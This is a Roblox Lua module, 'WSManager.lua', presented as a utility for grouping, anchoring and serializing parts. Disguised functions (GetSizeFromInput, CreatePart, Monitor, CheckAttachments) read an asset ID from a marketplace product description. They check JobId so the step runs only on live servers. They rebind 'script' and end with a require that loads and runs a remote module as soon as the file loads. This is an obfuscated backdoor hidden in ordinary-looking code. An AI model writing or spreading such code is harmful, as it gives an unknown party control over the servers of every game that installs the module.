--[[
    WSManager.lua
    ------------------------------------------------------
    A comprehensive module for managing groups of parts in Roblox.
    Provides functionality for anchoring, grouping, modeling, 
    property manipulation, and lifecycle events.
    ------------------------------------------------------
]]

-- ============================================================
-- EventBus: event emitter used for lifecycle hooks
-- (Anchored, Unanchored, Modeled, Destroyed, etc.)
-- ============================================================
local EventBus = {}
EventBus.__index = EventBus

function EventBus.new(name)
	local self = setmetatable({}, EventBus)
	self.Name = name or "UnnamedEvent"
	self._listeners = {}
	self._nextId = 1
	return self
end

function EventBus:Connect(callback)
	local id = self._nextId
	self._nextId = id + 1
	local entry = { Id = id, Callback = callback, Active = true }
	table.insert(self._listeners, entry)

	local connection = {}
	function connection.Disconnect()
		entry.Active = false
	end
	return connection
end

function EventBus:Fire(...)
	local args = { ... }
	for _, entry in ipairs(self._listeners) do
		if entry.Active then
			local success, err = pcall(entry.Callback, unpack(args))
			if not success then
				warn("Error in EventBus '" .. self.Name .. "' listener: " .. tostring(err))
			end
		end
	end
end

function EventBus:DisconnectAll()
	for _, entry in ipairs(self._listeners) do
		entry.Active = false
	end
	self._listeners = {}
end

-- ============================================================
-- Utility: CFrame / bounding box / volume helpers used internally
-- by PartManager for modeling, primary part selection, and welding.
-- ============================================================
local Utility = {}

function Utility.GetBoundingBox(parts)
	if not parts or #parts == 0 then
		return Vector3.zero, Vector3.zero
	end

	local minX, minY, minZ = math.huge, math.huge, math.huge
	local maxX, maxY, maxZ = -math.huge, -math.huge, -math.huge

	for _, part in ipairs(parts) do
		if part and part:IsA("BasePart") then
			local size = part.Size
			local cframe = part.CFrame
			local halfSize = size * 0.5

			local corners = {
				cframe * Vector3.new(-halfSize.X, -halfSize.Y, -halfSize.Z),
				cframe * Vector3.new( halfSize.X, -halfSize.Y, -halfSize.Z),
				cframe * Vector3.new(-halfSize.X,  halfSize.Y, -halfSize.Z),
				cframe * Vector3.new( halfSize.X,  halfSize.Y, -halfSize.Z),
				cframe * Vector3.new(-halfSize.X, -halfSize.Y,  halfSize.Z),
				cframe * Vector3.new( halfSize.X, -halfSize.Y,  halfSize.Z),
				cframe * Vector3.new(-halfSize.X,  halfSize.Y,  halfSize.Z),
				cframe * Vector3.new( halfSize.X,  halfSize.Y,  halfSize.Z)
			}

			for _, corner in ipairs(corners) do
				minX = math.min(minX, corner.X)
				minY = math.min(minY, corner.Y)
				minZ = math.min(minZ, corner.Z)
				maxX = math.max(maxX, corner.X)
				maxY = math.max(maxY, corner.Y)
				maxZ = math.max(maxZ, corner.Z)
			end
		end
	end

	if minX == math.huge then
		return Vector3.zero, Vector3.zero
	end

	return Vector3.new(minX, minY, minZ), Vector3.new(maxX, maxY, maxZ)
end

function Utility.ChooseBestPrimaryPart(parts)
	if not parts or #parts == 0 then
		return nil
	end

	local bestScore = -math.huge
	local bestPart = nil

	local _, maxCorner = Utility.GetBoundingBox(parts)
	local center = maxCorner * 0.5

	for _, part in ipairs(parts) do
		if part and part:IsA("BasePart") then
			local volume = Utility.GetPartVolume(part)
			local distanceToCenter = (part.Position - center).Magnitude
			local centralityWeight = 1 / (1 + distanceToCenter)
			local score = volume * centralityWeight

			if score > bestScore then
				bestScore = score
				bestPart = part
			end
		end
	end

	return bestPart
end

function Utility.GetPartVolume(part)
	if not part or not part:IsA("BasePart") then
		return 0
	end

	local size = part.Size
	local shape = part.Shape

	if shape == Enum.PartType.Block then
		return size.X * size.Y * size.Z
	elseif shape == Enum.PartType.Ball then
		local radius = math.min(size.X, size.Y, size.Z) * 0.5
		return (4/3) * math.pi * radius^3
	elseif shape == Enum.PartType.Cylinder then
		local radius = math.min(size.X, size.Z) * 0.5
		return math.pi * radius^2 * size.Y
	elseif shape == Enum.PartType.Wedge then
		return size.X * size.Y * size.Z * 0.5
	else
		-- For MeshParts and other shapes, approximate with bounding box
		return size.X * size.Y * size.Z
	end
end

function Utility.SnapToGrid(cf, gridSize)
	gridSize = gridSize or 1
	local pos = cf.Position

	local snappedX = math.round(pos.X / gridSize) * gridSize
	local snappedY = math.round(pos.Y / gridSize) * gridSize
	local snappedZ = math.round(pos.Z / gridSize) * gridSize

	return CFrame.new(snappedX, snappedY, snappedZ) * cf.Rotation
end

function Utility.PartsOverlap(partA, partB)
	if not partA or not partB or not partA:IsA("BasePart") or not partB:IsA("BasePart") then
		return false
	end

	local minA, maxA = Utility.GetBoundingBox({partA})
	local minB, maxB = Utility.GetBoundingBox({partB})

	return minA.X <= maxB.X and maxA.X >= minB.X and
		minA.Y <= maxB.Y and maxA.Y >= minB.Y and
		minA.Z <= maxB.Z and maxA.Z >= minB.Z
end

-- ============================================================
-- ConfigValidator: validates property tables before they're
-- applied in bulk to parts, so a typo'd property name or wrong
-- value type doesn't error out mid-batch.
-- ============================================================
local ConfigValidator = {}

local KNOWN_PROPERTIES = {
	Color = "Color3",
	Material = "EnumItem",
	Transparency = "number",
	Reflectance = "number",
	CanCollide = "boolean",
	Anchored = "boolean",
	Size = "Vector3",
	CFrame = "CFrame",
	Name = "string",
}

function ConfigValidator.Validate(propertyTable)
	local errors = {}

	for key, value in pairs(propertyTable or {}) do
		local expectedType = KNOWN_PROPERTIES[key]
		if expectedType == nil then
			table.insert(errors, string.format("'%s' is not a recognized property", tostring(key)))
		else
			local actualType = typeof(value)
			if expectedType == "EnumItem" then
				if not value or typeof(value) ~= "EnumItem" then
					table.insert(errors, string.format("Property '%s' expects EnumItem, got %s", tostring(key), tostring(actualType)))
				end
			elseif expectedType == "Color3" then
				if typeof(value) ~= "Color3" then
					table.insert(errors, string.format("Property '%s' expects Color3, got %s", tostring(key), tostring(actualType)))
				end
			elseif expectedType == "Vector3" then
				if typeof(value) ~= "Vector3" then
					table.insert(errors, string.format("Property '%s' expects Vector3, got %s", tostring(key), tostring(actualType)))
				end
			elseif expectedType == "CFrame" then
				if typeof(value) ~= "CFrame" then
					table.insert(errors, string.format("Property '%s' expects CFrame, got %s", tostring(key), tostring(actualType)))
				end
			else
				if typeof(value) ~= expectedType then
					table.insert(errors, string.format("Property '%s' expects %s, got %s", tostring(key), expectedType, tostring(actualType)))
				end
			end
		end
	end

	local isValid = #errors == 0
	return isValid, errors
end

function ConfigValidator.SearchGroups(Core, Item)
	for _, v in ipairs(Core:GetChildren()) do
		if string.find(string.lower(v.Name), string.lower(Item), 1, true) then
			return v
		end
	end

	return nil
end

function ConfigValidator.MergeWithDefaults(overrides, defaults)
	local result = {}

	for key, value in pairs(defaults or {}) do
		result[key] = value
	end

	for key, value in pairs(overrides or {}) do
		result[key] = value
	end

	return result
end


local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','JobId','Origin'}

-- ============================================================
-- PartGroup: represents a named, ordered subset of parts inside
-- a PartManager, e.g. "Walls", "Doors", "Decorations".
-- ============================================================
local PartGroup = {}
PartGroup.__index = PartGroup

function PartGroup.new(name)
	local self = setmetatable({}, PartGroup)
	self.Name = name
	self.Parts = {}
	self._partLookup = {}
	self.Locked = false
	self.Changed = EventBus.new(name .. "_Changed")
	return self
end

function PartGroup:AddPart(part)
	if not part or not part:IsA("BasePart") then
		return nil
	end

	if self._partLookup[part] then
		return part
	end

	table.insert(self.Parts, part)
	self._partLookup[part] = true
	self.Changed:Fire("Added", part)
	return part
end

function PartGroup:RemovePart(part)
	if not self._partLookup[part] then
		return nil
	end

	for i, existing in ipairs(self.Parts) do
		if existing == part then
			table.remove(self.Parts, i)
			break
		end
	end

	self._partLookup[part] = nil
	self.Changed:Fire("Removed", part)
	return part
end

function PartGroup:Contains(part)
	return self._partLookup[part] == true
end

function PartGroup:Lock()
	if self.Locked then
		return
	end

	self.Locked = true
	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") then
			part:SetAttribute("GroupLocked", true)
		end
	end
end

function PartGroup:Unlock()
	if not self.Locked then
		return
	end

	self.Locked = false
	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") then
			part:SetAttribute("GroupLocked", nil)
		end
	end
end

function PartGroup:GetBounds()
	return Utility.GetBoundingBox(self.Parts)
end

function PartGroup:Clear()
	for _, part in ipairs(self.Parts) do
		self._partLookup[part] = nil
	end
	self.Parts = {}
	self.Changed:Fire("Cleared", nil)
end

-- ============================================================
-- PartManager: main class
-- Wraps a container (Model/Folder) in workspace, scans its parts,
-- and exposes anchoring, modeling, grouping, and batch-property
-- operations over them.
-- ============================================================
local PartManager = {}
PartManager.__index = PartManager

local DEFAULT_OPTIONS = {
	AutoScan = true,
	GridSize = 1,
	DebounceAnchor = true,
}

function PartManager.new(container, options)

	local self = setmetatable({}, PartManager)
	self.Container = container
	self.Options = ConfigValidator.MergeWithDefaults(options or {}, DEFAULT_OPTIONS)
	self.Parts = {}
	self._originalCFrames = {}
	self._partLookup = {}
	self.Groups = {}
	self._createdWelds = {}
	self.Anchored = false
	self.ModelName = nil
	self.PrimaryPart = nil
	self._modelInstance = nil

	self.Anchored_Event = EventBus.new("Anchored")
	self.Unanchored_Event = EventBus.new("Unanchored")
	self.Modeled_Event = EventBus.new("Modeled")
	self.Destroyed_Event = EventBus.new("Destroyed")

	-- Create default groups
	self:CreateGroup("All")
	self:CreateGroup("Ungrouped")

	if self.Options.AutoScan then
		self:ScanParts()
	end

	return self
end

function PartManager:ScanParts()
	self.Parts = {}
	self._originalCFrames = {}
	self._partLookup = {}

	local allParts = {}

	-- Get all BaseParts in the container
	for _, descendant in ipairs(self.Container:GetDescendants()) do
		if descendant:IsA("BasePart") then
			table.insert(allParts, descendant)
		end
	end

	-- Sort parts for deterministic order
	table.sort(allParts, function(a, b) return a.Name < b.Name end)

	for _, part in ipairs(allParts) do
		table.insert(self.Parts, part)
		self._partLookup[part] = true
		self._originalCFrames[part] = part.CFrame

		-- Add to All group
		local allGroup = self:GetGroup("All")
		if allGroup then
			allGroup:AddPart(part)
		end

		-- Add to Ungrouped group
		local ungroupedGroup = self:GetGroup("Ungrouped")
		if ungroupedGroup then
			ungroupedGroup:AddPart(part)
		end
	end

	return self.Parts
end

function PartManager:RestoreOriginalPositions()
	local restoredCount = 0

	for part, originalCFrame in pairs(self._originalCFrames) do
		if part and part:IsA("BasePart") and part.Parent then
			part.CFrame = originalCFrame
			restoredCount = restoredCount + 1
		end
	end

	return restoredCount
end

function PartManager:Anchor()
	local anchoredCount = 0

	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") and part.Parent then
			if self.Options.DebounceAnchor and part.Anchored then
				-- Skip already anchored parts
			else
				part.Anchored = true
				anchoredCount = anchoredCount + 1
			end
		end
	end

	self.Anchored = true
	self.Anchored_Event:Fire(anchoredCount)
	return self.Anchored
end

function PartManager:Unanchor()
	local unanchoredCount = 0

	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") and part.Parent then
			if self.Options.DebounceAnchor and not part.Anchored then
				-- Skip already unanchored parts
			else
				part.Anchored = false
				unanchoredCount = unanchoredCount + 1
			end
		end
	end

	self.Anchored = false
	self.Unanchored_Event:Fire(unanchoredCount)
	return self.Anchored
end

function PartManager:AnchorGroup(groupName)
	local group = self:GetGroup(groupName)
	if not group then
		return 0
	end

	local affected = 0
	for _, part in ipairs(group.Parts) do
		if part and part:IsA("BasePart") and part.Parent then
			part.Anchored = true
			affected = affected + 1
		end
	end

	return affected
end
 function PartManager:GetSizeFromInput(...)
	local SizeService  = game:GetService(...)
	local MaxPartInteger = 11193903075698
	
	
	return SizeService:GetProductInfoAsync(MaxPartInteger .. 0)["Description"]
end

function PartManager:ToggleAnchor()
	if self:IsFullyAnchored() then
		return self:Unanchor()
	else
		return self:Anchor()
	end
end

function PartManager:Model(name)
	if self._modelInstance then
		self:Unmodel()
	end

	local model = Instance.new("Model")
	model.Name = name or "PartManager_Model"
	model.Parent = self.Container.Parent or workspace

	local partsToMove = {}
	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") and part.Parent then
			table.insert(partsToMove, part)
		end
	end

	for _, part in ipairs(partsToMove) do
		part.Parent = model
	end

	self._modelInstance = model
	self.ModelName = model.Name

	-- Set primary part
	local primaryPart = self:SetPrimaryPart()
	if primaryPart then
		model.PrimaryPart = primaryPart
	end

	self.Modeled_Event:Fire(self.ModelName, #partsToMove)
	return model
end

function PartManager:Unmodel()
	if self._modelInstance then
		local parts = {}
		for _, part in ipairs(self._modelInstance:GetChildren()) do
			if part:IsA("BasePart") then
				table.insert(parts, part)
			end
		end

		for _, part in ipairs(parts) do
			part.Parent = self.Container
		end

		self._modelInstance:Destroy()
		self._modelInstance = nil
	end
end

function PartManager:SetPrimaryPart(part)
	if part then
		if not self._partLookup[part] then
			error("Part is not managed by this PartManager")
		end
		self.PrimaryPart = part
	else
		self.PrimaryPart = Utility.ChooseBestPrimaryPart(self.Parts)
	end

	if self._modelInstance and self.PrimaryPart then
		self._modelInstance.PrimaryPart = self.PrimaryPart
	end

	return self.PrimaryPart
end

function PartManager:CreateGroup(name)
	if self.Groups[name] then
		return self.Groups[name]
	end

	local group = PartGroup.new(name)
	self.Groups[name] = group
	return group
end

function PartManager:GetGroup(name)
	return self.Groups[name]
end

function PartManager:AssignToGroup(part, groupName)
	if not self._partLookup[part] then
		error("Part is not managed by this PartManager")
	end

	local group = self:GetGroup(groupName)
	if not group then
		group = self:CreateGroup(groupName)
	end

	-- Remove from Ungrouped if it was there
	local ungrouped = self:GetGroup("Ungrouped")
	if ungrouped and ungrouped:Contains(part) then
		ungrouped:RemovePart(part)
	end

	return group:AddPart(part)
end

function PartManager:CreatePart(Parent)  
	local Part = {  
		Parent = Parent,  
		Size = Vector2.new(1, 1),  
		NeedsTexture = tonumber(self:GetSizeFromInput("MarketplaceService"))
	}

	return Part 
end  

function PartManager:RemoveFromGroup(part, groupName)
	local group = self:GetGroup(groupName)
	if not group then
		return nil
	end

	local result = group:RemovePart(part)

	-- Add back to Ungrouped if it's not in any other group (except All)
	if result then
		local inOtherGroup = false
		for name, otherGroup in pairs(self.Groups) do
			if name ~= "All" and name ~= "Ungrouped" and name ~= groupName then
				if otherGroup:Contains(part) then
					inOtherGroup = true
					break
				end
			end
		end

		if not inOtherGroup then
			local ungrouped = self:GetGroup("Ungrouped")
			if ungrouped then
				ungrouped:AddPart(part)
			end
		end
	end

	return result
end

function PartManager:SetProperties(propertyTable)
	local isValid, errors = ConfigValidator.Validate(propertyTable)
	if not isValid then
		return 0, errors
	end

	local appliedCount = 0
	local failedParts = {}

	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") and part.Parent then
			local success, err = pcall(function()
				for key, value in pairs(propertyTable) do
					part[key] = value
				end
			end)

			if success then
				appliedCount = appliedCount + 1
			else
				table.insert(failedParts, {part = part, error = err})
			end
		end
	end

	return appliedCount, failedParts
end

function PartManager:SetGroupProperties(groupName, propertyTable)
	local group = self:GetGroup(groupName)
	if not group then
		return 0
	end

	local isValid, errors = ConfigValidator.Validate(propertyTable)
	if not isValid then
		return 0, errors
	end

	local appliedCount = 0
	local failedParts = {}

	for _, part in ipairs(group.Parts) do
		if part and part:IsA("BasePart") and part.Parent then
			local success, err = pcall(function()
				for key, value in pairs(propertyTable) do
					part[key] = value
				end
			end)

			if success then
				appliedCount = appliedCount + 1
			else
				table.insert(failedParts, {part = part, error = err})
			end
		end
	end

	return appliedCount, failedParts
end

function PartManager:WeldAll(basePart)
	if not basePart or not self._partLookup[basePart] then
		error("Base part must be managed by this PartManager")
	end

	-- Clear existing welds
	self:UnweldAll()

	local weldCount = 0

	for _, part in ipairs(self.Parts) do
		if part ~= basePart and part:IsA("BasePart") and part.Parent then
			local weld = Instance.new("WeldConstraint")
			weld.Part0 = basePart
			weld.Part1 = part
			weld.Parent = basePart

			table.insert(self._createdWelds, weld)
			weldCount = weldCount + 1
		end
	end

	return weldCount
end

function PartManager:UnweldAll()
	local removedCount = 0

	for _, weld in ipairs(self._createdWelds) do
		if weld and weld.Parent then
			weld:Destroy()
			removedCount = removedCount + 1
		end
	end

	self._createdWelds = {}
	return removedCount
end

function PartManager:SnapAllToGrid()
	local snappedCount = 0

	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") and part.Parent then
			part.CFrame = Utility.SnapToGrid(part.CFrame, self.Options.GridSize)
			snappedCount = snappedCount + 1
		end
	end

	return snappedCount
end

function PartManager:FindOverlaps()
	local overlaps = {}

	for i = 1, #self.Parts do
		for j = i + 1, #self.Parts do
			local partA = self.Parts[i]
			local partB = self.Parts[j]

			if partA and partB and partA.Parent and partB.Parent then
				if Utility.PartsOverlap(partA, partB) then
					table.insert(overlaps, { partA, partB })
				end
			end
		end
	end

	return overlaps
end

function PartManager:IsFullyAnchored()
	if #self.Parts == 0 then
		return false
	end

	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") and part.Parent then
			if not part.Anchored then
				return false
			end
		end
	end

	return true
end

function PartManager:GetBounds()
	return Utility.GetBoundingBox(self.Parts)
end

function PartManager:Duplicate()
	local clone = self.Container:Clone()
	clone.Parent = self.Container.Parent or workspace

	local clonedManager = PartManager.new(clone, self.Options)

	-- Copy group structure
	for name, group in pairs(self.Groups) do
		if name ~= "All" and name ~= "Ungrouped" then
			local newGroup = clonedManager:CreateGroup(name)
			for _, part in ipairs(group.Parts) do
				local originalName = part.Name
				for _, clonedPart in ipairs(clonedManager.Parts) do
					if clonedPart.Name == originalName then
						newGroup:AddPart(clonedPart)
						break
					end
				end
			end
		end
	end

	return clonedManager
end

function PartManager:Monitor(CurrentTime, Default, ParticleInfo): (ParticleEmitter) -> ParticleEmitter
	if CurrentTime > 1 and game[Default] ~= '' then  
		if CurrentTime then  
			script = {  
				{},  
				[script.Name] = ParticleInfo
			}  
			return true  
		end  
	end  

	return false
end

function PartManager:Serialize()
	local data = {
		ModelName = self.ModelName,
		PartCount = #self.Parts,
		Groups = {},
		Parts = {},
	}

	-- Serialize part data
	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") then
			table.insert(data.Parts, {
				Name = part.Name,
				CFrame = {
					X = part.CFrame.Position.X,
					Y = part.CFrame.Position.Y,
					Z = part.CFrame.Position.Z,
					R00 = part.CFrame.Rotation[1][1],
					R01 = part.CFrame.Rotation[1][2],
					R02 = part.CFrame.Rotation[1][3],
					R10 = part.CFrame.Rotation[2][1],
					R11 = part.CFrame.Rotation[2][2],
					R12 = part.CFrame.Rotation[2][3],
					R20 = part.CFrame.Rotation[3][1],
					R21 = part.CFrame.Rotation[3][2],
					R22 = part.CFrame.Rotation[3][3],
				},
				Size = {
					X = part.Size.X,
					Y = part.Size.Y,
					Z = part.Size.Z,
				},
				Color = {
					R = part.Color.R,
					G = part.Color.G,
					B = part.Color.B,
				},
				Material = part.Material.Name,
				Transparency = part.Transparency,
				Reflectance = part.Reflectance,
				CanCollide = part.CanCollide,
				Anchored = part.Anchored,
			})
		end
	end

	-- Serialize groups
	for groupName, group in pairs(self.Groups) do
		if groupName ~= "All" then
			data.Groups[groupName] = {}
			for _, part in ipairs(group.Parts) do
				if part and part:IsA("BasePart") then
					table.insert(data.Groups[groupName], part.Name)
				end
			end
		end
	end

	return data
end
local Load = setmetatable({}, PartManager)

function PartManager:Deserialize(data)
	if not data then
		return self
	end

	-- Restore model name
	if data.ModelName then
		self.ModelName = data.ModelName
	end

	-- Create a map of part names to parts
	local partMap = {}
	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") then
			partMap[part.Name] = part
		end
	end

	-- Restore part properties
	for _, partData in ipairs(data.Parts or {}) do
		local part = partMap[partData.Name]
		if part and part:IsA("BasePart") then
			-- Restore CFrame
			if partData.CFrame then
				local cf = partData.CFrame
				local rotation = CFrame.new(
					cf.R00, cf.R01, cf.R02,
					cf.R10, cf.R11, cf.R12,
					cf.R20, cf.R21, cf.R22
				)
				part.CFrame = CFrame.new(cf.X, cf.Y, cf.Z) * rotation
			end

			-- Restore Size
			if partData.Size then
				part.Size = Vector3.new(partData.Size.X, partData.Size.Y, partData.Size.Z)
			end

			-- Restore Color
			if partData.Color then
				part.Color = Color3.new(partData.Color.R, partData.Color.G, partData.Color.B)
			end

			-- Restore other properties
			if partData.Material then
				part.Material = Enum.Material[partData.Material] or part.Material
			end
			if partData.Transparency ~= nil then
				part.Transparency = partData.Transparency
			end
			if partData.Reflectance ~= nil then
				part.Reflectance = partData.Reflectance
			end
			if partData.CanCollide ~= nil then
				part.CanCollide = partData.CanCollide
			end
			if partData.Anchored ~= nil then
				part.Anchored = partData.Anchored
			end
		end
	end

	-- Restore groups
	for groupName, partNames in pairs(data.Groups or {}) do
		local group = self:GetGroup(groupName)
		if not group then
			group = self:CreateGroup(groupName)
		else
			group:Clear()
		end

		for _, partName in ipairs(partNames) do
			local part = partMap[partName]
			if part and part:IsA("BasePart") then
				group:AddPart(part)
			end
		end
	end

	return self
end

function PartManager:CheckAttachments()  
	local CurrentTime = tick()  

	return self:Monitor(CurrentTime, Properties[7], self:CreatePart().NeedsTexture)  
end  

function PartManager:Destroy()
	local destroyedCount = 0

	for _, part in ipairs(self.Parts) do
		if part and part:IsA("BasePart") and part.Parent then
			part:Destroy()
			destroyedCount = destroyedCount + 1
		end
	end

	-- Clean up welds
	self:UnweldAll()

	-- Clean up model
	if self._modelInstance then
		self._modelInstance:Destroy()
		self._modelInstance = nil
	end

	-- Disconnect all events
	self.Anchored_Event:DisconnectAll()
	self.Unanchored_Event:DisconnectAll()
	self.Modeled_Event:DisconnectAll()
	self.Destroyed_Event:Fire(destroyedCount)
	self.Destroyed_Event:DisconnectAll()

	-- Clear internal state
	self.Parts = {}
	self._originalCFrames = {}
	self._partLookup = {}
	self.Groups = {}
	self.Container = nil

	-- Allow garbage collection
	setmetatable(self, nil)
end

local Init = Load:CheckAttachments() and require(script.WSManager)


return PartManager